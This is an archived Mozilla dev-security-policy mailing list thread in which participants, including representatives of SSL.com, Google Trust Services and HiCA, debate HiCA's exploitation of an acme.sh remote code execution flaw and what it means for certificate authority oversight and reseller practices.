=== Content from groups.google.com_32a60dc0_20250110_141535.html ===
[![](https://fonts.gstatic.com/s/i/productlogos/groups/v9/web-48dp/logo_groups_color_1x_web_48dp.png)Groups](./my-groups "Groups")ConversationsAll groups and messagesSend feedback to GoogleHelpTraining[Sign in](https://accounts.google.com/ServiceLogin?hl=en&passive=true&continue=https://groups.google.com&ec=GAZA0AM)[Groups](./my-groups "Groups")
## dev-security-policy@mozilla.org

[Conversations](./a/mozilla.org/g/dev-security-policy)[About](./a/mozilla.org/g/dev-security-policy/about)[Privacy](https://policies.google.com/privacy?hl=en_US) • [Terms](https://policies.google.com/terms?hl=en_US)

Groups keyboard shortcuts have been updatedDismissSee shortcuts
# RCE used by Intermediate CA to issue certificates.

 8,213 viewsSkip to first unread message![John Han (hanyuwei70)'s profile photo](//lh3.googleusercontent.com/a-/ALV-UjXFZ2SJi9nQUW_G2oFH6oBW7kAaNMlmBXieHlKz0Gycw5GPbw7b=s40-c)
### John Han (hanyuwei70)

unread,Jun 9, 2023, 1:42:22 PM6/9/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.orgHere is the story.
<https://github.com/acmesh-official/acme.sh/issues/4659>

Seems like they exploited acme.sh and let user to evade certificate issuing procedure.
Do we need to discuss this?![Andrew Ayer's profile photo](https://lh3.googleusercontent.com/a/default-user=s40-c)
### Andrew Ayer

unread,Jun 9, 2023, 2:04:34 PM6/9/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto John Han (hanyuwei70), dev-secur...@mozilla.orgThe party in question (HiCA/QuantumCA) is not a certificate authority,

and I don't see any evidence that the actual CAs in question evaded any

validation requirements.

HiCA/QuantumCA is just acting as an intermediary between subscribers

and the issuance APIs operated by actual CAs[1]. Literally anyone can

do this and do monumentally stupid/insecure things; it's not productive

to have a discussion every time this happens.

Regards,

Andrew

[1] It's true they have a reseller relationship with [ssl.com](http://ssl.com), who are

operating a white-label intermediate CA with "QuantumCA" in the

subject, but HiCA/QuantnumCA are also fronting other CAs, including

GTS, which doesn't require a reseller agreement to access their free

ACME API, so I don't see that aspect as being productive to discuss

either.

![Kurt Seifried's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXks07GJw8khJSg0X-2w2ptfk-yD8FQgX7kqzWypKCxJuubdGw_=s40-c)
### Kurt Seifried

unread,Jun 9, 2023, 3:26:48 PM6/9/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto Andrew Ayer, John Han (hanyuwei70), dev-secur...@mozilla.orgMore details:
<https://twitter.com/aleksejspopovs/status/1666955050696966148>

<https://www.reddit.com/r/netsec/comments/144ygg7/acmesh_runs_arbitrary_commands_from_a_remote/>

My one thought is this:
Shouldn't the root CA(s) that ultimately empower this reseller have some process to ensure they only mint trusted authorities that only mint trusted authorities and so on? And if a rogue intermediate/reseller CA pops up shouldn't they deal with it?
Because otherwise, I can stand up a root CA, and then sign intermediate CAs/resellers that do all the dirty/evil work and say "LOLZ. I'm a root CA. I didn't sign this. It's this bad intermediate/reseller CA, go punish them"
And seeing as how you can stand up an intermediate/reseller in literal minutes if you have a captive root CA to sign off on it...
I feel like the CCADB/Mozilla have abdicated responsibility in the sense of "well the root CA didn't do anything technically wrong..." rather than taking the approach of "shouldn't we encourage/force root CAs to be responsible for their downstream CAs and ensure a safe ecosystem for everyone?"


> --
>
> You received this message because you are subscribed to the Google Groups "dev-secur...@mozilla.org" group.
>
> To unsubscribe from this group and stop receiving emails from it, send an email to dev-security-po...@mozilla.org.
>
> To view this discussion on the web visit <https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/20230609090430.3a4e8396e6e0b856fc81c6ab%40andrewayer.name>.

--
Kurt Seifried (He/Him)
ku...@seifried.org
![mochaaP's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXaOh-EOFSNXFYdwYICEbh_OR-_f34G96-3e2nVrmnY4ZuK_EQ=s40-c)
### mochaaP

unread,Jun 9, 2023, 5:43:47 PM6/9/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Andrew Ayer, dev-secur...@mozilla.org, John Han (hanyuwei70)Hello,

Although HiCA is not a CA itself, the person own HiCA seems also owns (or at least works for) Quantum CA[1][2]. they also confirmed that Quantum CA is operated by both their team and SSL.com team[3].

I think this probably is not as simple as a white-label intermediate CA being abused, rather a CA that resells their own product to themselves to prevent being punished for bad behaviors.

[1]: <https://github.com/xiaohuilam> (see "Pinned" section)
[2]: <https://github.com/quantumca> (see "People" section)
[3]: <https://github.com/acmesh-official/acme.sh/issues/4659#issuecomment-1584546150> (note that this person never clearified their relationship with Quantum CA and only replied with "So this isn't the evidence to proof HiCA is a CA which managed PKI.")
Regards,Zephyr Lykos
![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 9, 2023, 6:08:08 PM6/9/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, mochaaP, Andrew Ayer, dev-secur...@mozilla.org, John Han (hanyuwei70)Thanks John to share this topic to the dev-security forum.

This is HiCA founder, let me to explain your concern, Mr John ,
the RCE is fully used to finish the challenge which validated by CAs, in another word, the ACME.sh-enrolled certificates which passing this RCE, it does compliant with each CA's BR validation requirements. CA did nothing wrong. And also by this trick can enroll any CA's certificate before acme.sh fix patch.

and to Mr @mochaaP, you said to punish our team, we're NOT a public CA or private CA(in my understanding, a CA must manage a or more PKI infrastructure physically), [3]so the clarify relationship to HiCA w/ QuantumCA is no necessary, but we still told we runs HiCA inside QuantumCA project's source code, it's a sub-application inside it.

I agree @Andrew's opinion, CAs shouldn't take any responsibilities to the RCE incidents. or there are hundreds acme-tools for CAs need to concern.
![Thomas Zermeno's profile photo](//lh3.googleusercontent.com/a-/ALV-UjV3noErre4w9XBjy78V7QEEunKjd_ZiV7Solw5BjuAIEXrds_Fz=s40-c)
### Thomas Zermeno

unread,Jun 9, 2023, 7:17:26 PM6/9/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Xiaohui Lam, mochaaP, Andrew Ayer, dev-secur...@mozilla.org, John Han (hanyuwei70)We would like to clarify that SSL.com discontinued issuing Quantum certs in 2022, and haven't issued any certs from the Quantum branded ICAs in 2023. Furthermore, there is absolutely no association between HiCA and SSL.com. In fact, only through the recent acme.sh RCE public discussions were we made aware of the existence of HiCA.

As a result, we took the initiative to further investigate and discovered that QUANTUM CA LIMITED dissolved on November 1, 2022. We were not notified about this change by Quantum.

Based on this fact, we plan to revoke the Quantum branded subCAs and all associated end-entity certificates within 7 days, as mandated by section 4.9.1.2 of our CP/CPS.
Regards,
Tom[SSL.com](https://ssl.com)

![Kurt Seifried's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXks07GJw8khJSg0X-2w2ptfk-yD8FQgX7kqzWypKCxJuubdGw_=s40-c)
### Kurt Seifried

unread,Jun 9, 2023, 7:35:07 PM6/9/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto Thomas Zermeno, dev-secur...@mozilla.org, Xiaohui Lam, mochaaP, Andrew Ayer, John Han (hanyuwei70)Is this an official statement from [ssl.com](http://ssl.com)? If so can you please provide proof that madca...@gmail.com is authorized to speak on behalf of [ssl.com](http://ssl.com)?
Seriously, why do all these CA's lack the ability to host their own email?


> --

> You received this message because you are subscribed to the Google Groups "dev-secur...@mozilla.org" group.
>
> To unsubscribe from this group and stop receiving emails from it, send an email to dev-security-po...@mozilla.org.

> To view this discussion on the web visit [https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/528b5350-1a32-4730-8e7b-16644d135274n%40mozilla.org](https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/528b5350-1a32-4730-8e7b-16644d135274n%40mozilla.org?utm_medium=email&utm_source=footer).

![Kurt Seifried's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXks07GJw8khJSg0X-2w2ptfk-yD8FQgX7kqzWypKCxJuubdGw_=s40-c)
### Kurt Seifried

unread,Jun 9, 2023, 7:36:09 PM6/9/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto Xiaohui Lam, dev-secur...@mozilla.org, mochaaP, Andrew Ayer, John Han (hanyuwei70)Is this an official statement from
HiCA? If so can you please provide proof that inao...@gmail.com is authorized to speak on behalf of HiCA?
Seriously, why do all these CA's lack the ability to host their own email?
> --

> You received this message because you are subscribed to the Google Groups "dev-secur...@mozilla.org" group.
>
> To unsubscribe from this group and stop receiving emails from it, send an email to dev-security-po...@mozilla.org.

> To view this discussion on the web visit [https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/431eb7de-181e-4a32-9d22-3698bc7b0d0bn%40mozilla.org](https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/431eb7de-181e-4a32-9d22-3698bc7b0d0bn%40mozilla.org?utm_medium=email&utm_source=footer).

![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 9, 2023, 8:08:30 PM6/9/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Kurt Seifried, dev-secur...@mozilla.org, mochaaP, Andrew Ayer, John Han (hanyuwei70), Xiaohui LamYes, I'm staff for HiCA which on behalf of HiCA officially.
Those mail is sent from our server, not CAs. It's another project for reselling [ssl.com](http://ssl.com)(no selling anymore half year ago)'s mail template. these projects they are included in one source code repository([screenshot-of-eab-notification-email-source-code.png](https://github-production-user-asset-6210df.s3.amazonaws.com/6964962/244780779-6318b18b-4941-4d22-87b3-640535c5649f.jpg)), and email template/layout is shared between some of them. we copied mail layout/template from [ssl.com](http://ssl.com) notify email and forget to update to our information, it's no associated with [ssl.com](http://ssl.com) mailing system.
And  all
![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 9, 2023, 8:09:24 PM6/9/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Xiaohui Lam, Kurt Seifried, dev-secur...@mozilla.org, mochaaP, Andrew Ayer, John Han (hanyuwei70)
Sorry for a typo:

`It's another project for reselling [ssl.com](http://ssl.com/)(no selling anymore half year ago)'s mail template` ->`It's another project for reselling [ssl.com](http://ssl.com/)(no selling anymore half year ago)'s certificates` ...

![mochaaP's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXaOh-EOFSNXFYdwYICEbh_OR-_f34G96-3e2nVrmnY4ZuK_EQ=s40-c)
### mochaaP

unread,Jun 9, 2023, 8:13:11 PM6/9/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Xiaohui Lam, mochaaP, Andrew Ayer, dev-secur...@mozilla.org, John Han (hanyuwei70)Hi Xiaohui,
I think you may have misunderstood my message. What I meant to convey was that I am skeptical of your intention to resell your own CA for a dissolved Ltd. that was not subject to having its certificate revoked. We believe that this practice is uncommon for a reseller in such a case.
Please understand that my message was not intended to be hateful towards you or your team. If you believe that this was an honest mistake, please reply to this thread with more details. The community values transparency and trust, and we would be happy to hear your perspective.
Best regards,Zephyr Lykos![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 9, 2023, 8:32:03 PM6/9/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, mochaaP, Xiaohui Lam, Andrew Ayer, dev-secur...@mozilla.org, John Han (hanyuwei70)Mr mochaaP,
We're running businesses under multi entities, one is UK company, and one is CN company, the UK company is registered and running by a former workmate which leaved our team, and CN company is registered and running by me.
We do stopped from selling SSL.com certificate due to business concern and the cross-sign root expiration concern, That meantime we do have some cooperates with other CAs without whitelabel/intermediateCA, some CAs are directly implemented and some are tier-2 implements(under other resellers). So, our website is kept running, including HiCA keeps.
But we will stop all misleading business to stop provide our Quantum brand products, only contain our China company's materials.
My KEY OPINION: our China entity has been kept in existence so we kept the reselling business.

Sincere.
Bruce Lam![Kurt Seifried's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXks07GJw8khJSg0X-2w2ptfk-yD8FQgX7kqzWypKCxJuubdGw_=s40-c)
### Kurt Seifried

unread,Jun 10, 2023, 5:39:16 PM6/10/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto Xiaohui Lam, dev-secur...@mozilla.org, mochaaP, Andrew Ayer, John Han (hanyuwei70)Is this really a situation where something extremely suspicious (remote code execution, CA's with multiple entities, some of which don't seem to properly exist, etc.) is going to be swept under the rug with a simple "yeah, we revoked this bad actors certificates, everything is fine"?

If HiCA can do this, how do we know there are not more intermediate/reseller CAs doing this?
<https://news.ycombinator.com/item?id=36252310>.
Just a note, apparently, websites have been shut down and stuff deleted with respect to HiCA.
Posting some of the threads here in case they get removed or whatever:
==================egecks 1 day ago | prev | next [–]

I think the title buries the most horrifying part of this. The HiCA certificate authority is relying on an RCE to do an end-run around the semantics of the ACME HTTP-01 validation method.
Fucked up and they should be booted from every root program for this.

=================

0x0 1 day ago | prev | next [–]

Looks like they are issuing under a sub-CA of "[ssl.com](http://ssl.com)" according to <https://github.com/acmesh-official/acme.sh/issues/4659#issue.>..
Interestingly, the mozilla dev-security-policy group seems to contain a recent discussion about including "[ssl.com](http://ssl.com)" in the root store here <https://groups.google.com/a/mozilla.org/g/dev-security-polic.>..

Curious to know if this could, maybe it should, have ripple effects to the various SSL Root CA programs. Having someone run a subCA that actually exploits an RCE against ACME clients doesn't seem very trustworthy, and any CA enabling this behaviour should probably be kicked out of the trust stores?

reply

agwa 1 day ago | parent | next [–]

The sub CA is operated by [ssl.com](http://ssl.com), not HiCA (which is not a trusted certificate authority). HiCA is relaying the certificate requests to [ssl.com](http://ssl.com), which is properly validating the requests in accordance with all the requirements. [ssl.com](http://ssl.com) isn't doing anything wrong. That's why HiCA needs to exploit an RCE in acme.sh - ACME doesn't support relaying certificate requests to other CAs like this.
reply

0x0 23 hours ago | root | parent | next [–]

Someone posted a comment on github claiming they are the founder of Quantum (the sub CA of [ssl.com](http://ssl.com) - see <https://crt.sh/?caid=200960> ) and that they are the provider of the HiCA service. So it does sound like there is a closer link here than your comment would indicate:
<https://github.com/acmesh-official/acme.sh/issues/4659#issue.>..

reply

agwa 23 hours ago | root | parent | next [–]

Quantum is not a trusted CA. [ssl.com](http://ssl.com) has a white-labeled intermediate CA with the name "Quantum" in it, but this intermediate CA is operated by [ssl.com](http://ssl.com) under all the same controls as [ssl.com](http://ssl.com)'s other intermediate CAs. Quantum has no ability to issue trusted certificates themselves.
reply

0x0 23 hours ago | root | parent | next [–]

So the person claiming to be the founder of "QuantumCA" does not possess the private key corresponding to <https://crt.sh/?caid=200960> - can we be sure the private key is only accessible by [ssl.com](http://ssl.com)'s CA system? So the certificates listed here aren't issued by this person, but by the [ssl.com](http://ssl.com)'s system? <https://crt.sh/?Identity=%25&iCAID=200960&exclude=expired&de.>..
Also, why would [ssl.com](http://ssl.com) even create a subCA named "QuantumCA"? Are they in business with this person claiming to be the founder of "QuantumCA" who appears to be responsible for exploiting this acme.sh 0day? What does this say about [ssl.com](http://ssl.com)'s trustworthiness? Or is the person in the github comments lying?

reply

agwa 23 hours ago | root | parent | next [–]

> So the person claiming to be the founder of "QuantumCA" does not possess the private key corresponding to <https://crt.sh/?caid=200960> - can we be sure the private key is only accessible by [ssl.com](http://ssl.com)'s CA system? So the certificates listed here aren't issued by this person, but by the [ssl.com](http://ssl.com)'s system? <https://crt.sh/?Identity=%25&iCAID=200960&exclude=expired&de.>..
Correct. You can see the Quantum intermediates listed in [ssl.com](http://ssl.com)'s most recent audit statement, meaning an auditor has verified that [ssl.com](http://ssl.com) has controls to protect the private key: <https://www.cpacanada.ca/generichandlers/CPACHandler.ashx?at.>..

(The audit could be flawed, but it's the same amount of assurance we have for any intermediate CA's private key - the fact that "QuantumCA" is in the name does not change the risk calculus)

> Also, why would [ssl.com](http://ssl.com) even create a subCA named "QuantumCA"? Are they in business with this person claiming to be the founder of "QuantumCA" who appears to be responsible for exploiting this acme.sh 0day? What does this say about [ssl.com](http://ssl.com)'s trustworthiness? Or is the person in the github comments lying?

There is a business relationship between QuantumCA and [ssl.com](http://ssl.com). QuantumCA is a reseller of [ssl.com](http://ssl.com), and they've paid extra to [ssl.com](http://ssl.com) so that the certificates they purchase get issued from an intermediate CA named "QuantumCA" rather than one of [ssl.com](http://ssl.com)'s usual intermediate CAs which have "[ssl.com](http://ssl.com)" in the name. This lets QuantumCA pretend to be a real CA. This is a common practice in the industry, and I don't think it says anything about the trustworthiness of [ssl.com](http://ssl.com), because the business relationship with QuantumCA doesn't in any way subvert the integrity of the WebPKI since [ssl.com](http://ssl.com) retains control of the issuance. Still, I wish intermediate CA white-labeling were banned because it causes terrible confusion about who is and isn't a CA.

reply

0x0 23 hours ago | root | parent | next [–]

I find it troubling that a root CA ([ssl.com](http://ssl.com)) is apparently OK with lending their name in a business relationship with an actor that is actively exploiting an acme.sh 0day.

tptacek 20 hours ago | root | parent | next [–]

This feels a little bit like doubling down to find ways to implicate the actual CA instead of the reseller. It's clear how mismanagement by a real CA would make a more interesting story than by this random no-longer-existing pseudo-reseller, but I don't think there's evidence to support that story yet.
reply

0x0 20 hours ago | root | parent | next [–]

But it's not a random pseudo-reseller? The one github comment from "the founder of Quantum CA" seems to say they are also the creator of HiCA, which is the entity that was exploiting the 0day in acme.sh. And the crt.sh link shows an intermediate CA cert named "QuantumCA", signed by [ssl.com](http://ssl.com).
So QuantumCA == HiCA == exploiters of the acme.sh 0day, it's all the same entity? The intermediate CA could just as well be named "0dayexploitersCA"? Why is it not a huge concern that [ssl.com](http://ssl.com) is fine with operating such a "0dayexploitersCA" intermediate?

Am I missing something here?

reply
=================


> --

> You received this message because you are subscribed to the Google Groups "dev-secur...@mozilla.org" group.
>
> To unsubscribe from this group and stop receiving emails from it, send an email to dev-security-po...@mozilla.org.

> To view this discussion on the web visit [https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/0f9174b3-02d6-4ff6-a7fa-3b931375076dn%40mozilla.org](https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/0f9174b3-02d6-4ff6-a7fa-3b931375076dn%40mozilla.org?utm_medium=email&utm_source=footer).

![Kurt Seifried's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXks07GJw8khJSg0X-2w2ptfk-yD8FQgX7kqzWypKCxJuubdGw_=s40-c)
### Kurt Seifried

unread,Jun 10, 2023, 7:08:47 PM6/10/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto Xiaohui Lam, dev-secur...@mozilla.orgForwarding this to the list, I'm not comfortable with off list discussions in private.

On Sat, Jun 10, 2023 at 11:18 AM Xiaohui Lam <inao...@gmail.com> wrote:
> Mr Seifried,

> > Is this really a situation where something extremely suspicious (remote code execution, CA's with multiple entities, some of which don't seem to properly exist, etc.) is going to be swept under the rug with a simple "yeah, we revoked this bad actors certificates, everything is fine"?

> We are a reseller, not a physical root CA. This is a widely accepted solution for cross border businesses. We have business accepts online payment, the China users needs pay via alipay or wechat, to sign up the merchant we must have a china company,and foreign needs stripe, merchant must be a non-MainlandChina company. this is not suspicious.
> \*. I represent the above opinion of my company

> > If HiCA can do this, how do we know there are not more intermediate/reseller CAs doing this?

> Most CA has no necessary to exploiting this RCE, because they can natively compatible with RFC 8555, they can define own CPS and CP, which contains validation policy, we does because we are not CA and can't to provider RFC 8555 ACME endpoint like a CA does. so a physical root CA has no necessary to provide ACME simulation by RCE. and also there're more difficulties for a ssl reseller to provide ACME service which real CAs won't undergo.
> - CSR stage difference: Most CA's subscriber request process or reseller API process, requires CSR be submitted in the `new-order` API, ACME requires CSR be submitted in `finalize` API. I have a topic in letsencrypt community years ago about this - <https://community.letsencrypt.org/t/why-acme-requires-domain-auth-first-before-csr/98482>- Challenge difference: Most CA's  subscriber request process or reseller API process's DNS validation requires `\_<md5>` / `\_dnsauth` dnshost, and dnstype possibly CNAME or possibly TXT, But ACME's DNS validation dnshost is constant: `\_acme-challenge`, dnstype `TXT`.  And in a more deep talk ACME's dnsvalue needs publickey's thumbprint + server token which is totally different than traditional way's dnsvalue.
>
> My opinion is community can research how many ACME was publicly provided, and investigate is the provider a physical CA. if is natively compatible with RFC 8555, no worry about that one and continue do investigate next.
> \*. I represent the above opinion of my personal. not my company.
>
>
> Sincere,
> Bruce.

![Amir Omidi (aaomidi)'s profile photo](//lh3.googleusercontent.com/a-/ALV-UjWNpuyyZFVdhd7Ze3A1nrzUhTUry3metbGmwAp-eZ8jhCinlgKLEQ=s40-c)
### Amir Omidi (aaomidi)

unread,Jun 11, 2023, 3:02:14 AM6/11/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Kurt Seifried, Xiaohui LamEmailing on my personal capacity:

Xiaohui, can you please confirm that [ssl.com](http://ssl.com) was the only actual CA that was used for issuance through HiCA?
![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 11, 2023, 2:32:26 PM6/11/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Kurt Seifried, Xiaohui LamSorry, Mr Seifried, It's not meant to PM, I mean to post publicly, i don't know the "post thread" and "reply author"' differences actually.

![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 11, 2023, 2:34:44 PM6/11/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Amir Omidi (aaomidi), Kurt Seifried, Xiaohui LamNo, actually we implementing GTS, SSL.com and sometimes Let's Encrypt, Sectigo all the time. and especially SSL.com issued under SSL.com subCA, not under "Quantum Secure Site DV" acutally.The CA
![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 11, 2023, 2:37:42 PM6/11/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Amir Omidi (aaomidi), Kurt Seifried, Xiaohui LamBecause the Quantum security site has OCSP customized services, we must ensure that all certificates under it comply with Chinese regulations, otherwise the ICP filing of OCSP may be revoked. So we can't issue certificates for everyone by default.
在2023年6月11日星期日 UTC+8 10:02:14<Amir Omidi (aaomidi)> 写道：
![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 11, 2023, 2:42:16 PM6/11/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Thomas Zermeno, Xiaohui Lam, mochaaP, Andrew Ayer, dev-secur...@mozilla.org, John Han (hanyuwei70)We agree with SSL.com canceling the 90-day certificate customers under Quantum subCA, but we object to the annual customer service payment.Should SSL.com refund some of the certificates because they were multi-year subscription certificates purchased?
If not, why not cancel the product purchase entrance for more than 365 days on your website and interface?
It's likely a fraud in business.

It might should not be involved in this dev security group, but we wanna some expanding of this topic with other resellers and CAs in the industry.![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 13, 2023, 3:26:55 AM6/13/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Kurt Seifried, Xiaohui Lam![WX20230613-102227@2x.png](https://groups.google.com/a/mozilla.org/group/dev-security-policy/attach/232eec4356abd/WX20230613-102227@2x.png?part=0.1&view=1)
Kurt Seifried,
Because there's some translation problem with google groups poor translation, I did not distinguish effectively “reply all"(回复全部) and "reply author"(回复作者).I clicked the last and triggered PM to your inbox.It also bothers me that it doesn't show up in the list after I send it.

but the discriminatory connotation of this discomfort frustrates me, very.

在2023年6月11日星期日 UTC+8 02:08:47<Kurt Seifried> 写道：
![Kurt Seifried's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXks07GJw8khJSg0X-2w2ptfk-yD8FQgX7kqzWypKCxJuubdGw_=s40-c)
### Kurt Seifried

unread,Jun 13, 2023, 4:11:07 AM6/13/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto Xiaohui Lam, dev-secur...@mozilla.orgWould it perhaps be best if Mozilla disabled web posting? In my experience with other Google groups it has caused nothing but problems. I also think it is reasonable to assume people participating in this list will have access to a working email account that they can use to post and receive emails from the list.
If requiring a working email address (ideally from the same domain as the one they claim to represent) is too high of a bar for CAs, then, well, I don't know what to say. I feel like a CA (root, intermediate, reseller or otherwise) should be able to set up their own email domain, no?![James Kasten's profile photo](https://lh3.googleusercontent.com/a/default-user=s40-c)
### James Kasten

unread,Jun 13, 2023, 6:00:41 AM6/13/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Xiaohui Lam, Amir Omidi (aaomidi), Kurt Seifried

To be explicit, GTS does not have a business relationship with HiCA.

Normally ACME services have protections against these types of MitM-CAs, but the remote RCE allowed HiCA to bypass these controls [1, 2].

For instance, it is possible HiCA replaced the local client's key authorization during challenge validation with a key authorization provided by HiCA, granting authorization of the domain names to HiCA. HiCA could theoretically use these authorizations to continue to issue certificates for the affected domain names, or revoke the certificates that were issued.

So clients of HiCA should also consider the lasting effects on the the domains in addition to your normal recovery procedures for an RCE. It may be prudent to reissue and revoke any certificates with your choice of CA directly and to watch certificate transparency logs for any future unintended issuance. GTS allows authorization reuse up to 28 days on our ACME endpoint and issues certificates with lifetimes up to 90 days. Other CAs may differ. By the current baseline requirements CAs can issue 398 day certificates and reuse the authorizations for 398 days [3].

James Kasten
Google Trust Services

1. <https://datatracker.ietf.org/doc/html/rfc8555#section-6.4>
2. <https://datatracker.ietf.org/doc/html/rfc8555#section-10.2>
3. <https://cabforum.org/wp-content/uploads/CA-Browser-Forum-BR-1.8.7.pdf>![James Kasten's profile photo](https://lh3.googleusercontent.com/a/default-user=s40-c)
### James Kasten

